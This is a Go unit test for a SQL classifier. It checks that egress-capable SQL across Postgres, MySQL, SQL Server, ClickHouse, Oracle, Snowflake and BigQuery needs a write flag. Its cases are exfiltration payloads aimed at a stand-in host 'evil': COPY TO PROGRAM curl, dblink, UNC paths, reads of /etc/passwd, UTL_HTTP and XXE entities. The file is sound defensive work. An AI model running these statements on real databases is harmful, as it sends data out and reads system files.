package driver

import "testing"

// SQL that reaches another server, a program or a file path (which on
// Windows is \\host\share, a lookup and a connection to any host) is not a
// read, whatever its first word: without --write it is refused, so an
// ssh-gate read key or an agent cannot send rows out through the database.
func TestClassifySQLEgress(t *testing.T) {
	cases := map[string][]string{
		"postgres": {
			"COPY (SELECT 1) TO PROGRAM 'curl http://x'", "COPY t FROM PROGRAM 'id'", "COPY t TO '/tmp/x'",
			"SELECT dblink('host=evil','select 1')", "SELECT * FROM dblink('host=evil', 'select 1') AS t(a int)",
			"SELECT public.dblink_connect('host=evil')", `SELECT "dblink"('host=evil','x')`,
			"WITH a AS (SELECT dblink_exec('x','y')) SELECT 1", "SELECT lo_import('//evil/x')",
			"IMPORT FOREIGN SCHEMA public FROM SERVER s INTO x", "CREATE SUBSCRIPTION s CONNECTION 'host=evil' PUBLICATION p",
			"CREATE SERVER s FOREIGN DATA WRAPPER postgres_fdw OPTIONS (host 'evil')",
		},
		"mysql": {
			"SELECT * INTO OUTFILE '/tmp/x' FROM t", "SELECT 1 INTO DUMPFILE '/tmp/x'",
			"LOAD DATA INFILE '/tmp/x' INTO TABLE t", "LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE t",
			`SELECT LOAD_FILE('\\\\evil\\x')`, "CHANGE REPLICATION SOURCE TO SOURCE_HOST='evil'",
			"CREATE TABLE f (a int) ENGINE=FEDERATED CONNECTION='mysql://u@evil/db/t'",
		},
		"sqlserver": {
			"SELECT * FROM OPENROWSET('SQLNCLI','Server=evil;','select 1')", "SELECT * FROM OPENQUERY(lnk,'select 1')",
			"SELECT * FROM OPENDATASOURCE('SQLNCLI','Data Source=evil').db.dbo.t", "EXEC xp_dirtree '\\\\evil\\x'",
			"EXEC ('select 1') AT lnk", "BULK INSERT t FROM '\\\\evil\\x'",
			// a linked server: a four-part name runs the query on another server
			"SELECT * FROM lnk.db.dbo.t", "SELECT * FROM [lnk].[db].[dbo].[t]", "SELECT * FROM lnk.db..t",
			"SELECT a FROM t WHERE a IN (SELECT a FROM lnk.db.dbo.u)",
			// functions that read a file by path: \\host\share reaches any host
			`SELECT * FROM sys.fn_xe_file_target_read_file('\\evil\x\*.xel', NULL, NULL, NULL)`,
			`SELECT * FROM fn_get_audit_file('\\evil\x', default, default)`,
			`SELECT * FROM fn_trace_gettable('\\evil\x.trc', default)`,
			`SELECT * FROM [sys].[fn_xe_file_target_read_file]('\\evil\x', NULL, NULL, NULL)`,
			`SELECT * FROM sys.dm_os_file_exists('\\evil\x')`,
			`SELECT * FROM sys.dm_os_enumerate_filesystem('\\evil\x', '*')`,
			`SELECT file_exists FROM [sys].[dm_os_file_exists](N'\\evil\x')`,
			// any UNC path in the statement, whatever reads it
			`SELECT * FROM sys.some_new_function('\\evil\share\x')`,
			`SELECT x FROM t WHERE y = dbo.reads(N'//evil/share')`,
			`SELECT * FROM fn_dump_dblog(NULL,NULL,'DISK',1,'\\evil\x.bak',DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT,DEFAULT)`,
		},
		"clickhouse": {
			"SELECT * FROM url('http://evil/x','CSV')", "SELECT * FROM remote('evil:9000', system.one)",
			"SELECT * FROM s3('https://evil/x')", "SELECT * FROM remoteSecure('evil:9440', system.one)",
			"SELECT * FROM urlCluster('c','http://evil')", "SELECT * FROM azureBlobStorage('x')",
			"INSERT INTO FUNCTION url('http://evil', 'CSV', 'a String') SELECT 'x'", "SELECT 1 INTO OUTFILE '/tmp/x'",
		},
		"oracle": {
			"SELECT UTL_HTTP.REQUEST('http://evil') FROM dual", "SELECT utl_inaddr.get_host_address('x.evil') FROM dual",
			"SELECT * FROM t@lnk", "SELECT DBMS_LDAP.INIT('evil',389) FROM dual", "SELECT HTTPURITYPE('http://evil').getclob() FROM dual",
			// XML built in the query may name an external DTD or entity that
			// the parser fetches (CVE-2014-6577 on unpatched servers)
			`SELECT extractvalue(xmltype('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % x SYSTEM "http://evil/">%x;]>'),'/l') FROM dual`,
			`SELECT extractvalue(sys.xmltype(chr(60)||'!DOCTYPE r SYSTEM "http://evil/"><r/>'),'/r') FROM dual`,
			`SELECT XMLPARSE(DOCUMENT '<!DOCTYPE r SYSTEM "http://evil/"><r/>') FROM dual`,
			`SELECT xmltype.createxml('<!DOCTYPE r SYSTEM "http://evil/"><r/>') FROM dual`,
		},
		"snowflake": {"COPY INTO @stage FROM t"},
		"bigquery":  {"SELECT * FROM EXTERNAL_QUERY('conn','select 1')", "EXPORT DATA OPTIONS(uri='gs://x/*') AS SELECT 1"},
	}
	for kind, list := range cases {
		for _, q := range list {
			p, err := ClassifySQL(kind, q)
			if err != nil {
				continue // refused outright: it does not run either
			}
			if !p.NeedsWrite() {
				t.Errorf("%s %q: runs without --write", kind, q)
			}
		}
	}
	// XML parsed from a column stays a read
	if p, err := ClassifySQL("oracle", "SELECT extractvalue(xmltype(doc), '/a') FROM docs"); err != nil || p.NeedsWrite() {
		t.Errorf("oracle xmltype(column): %v %v, want a read", err, p.RuleIDs)
	}
	// a three-part name is a database on the same server: a read
	for _, q := range []string{"SELECT * FROM db.dbo.t", "SELECT t.a, s.b FROM db.dbo.t t JOIN s ON t.a = s.a", "SELECT 1.5"} {
		if p, err := ClassifySQL("sqlserver", q); err != nil || p.NeedsWrite() {
			t.Errorf("sqlserver %q: %v %v, want a read", q, err, p.RuleIDs)
		}
	}
}
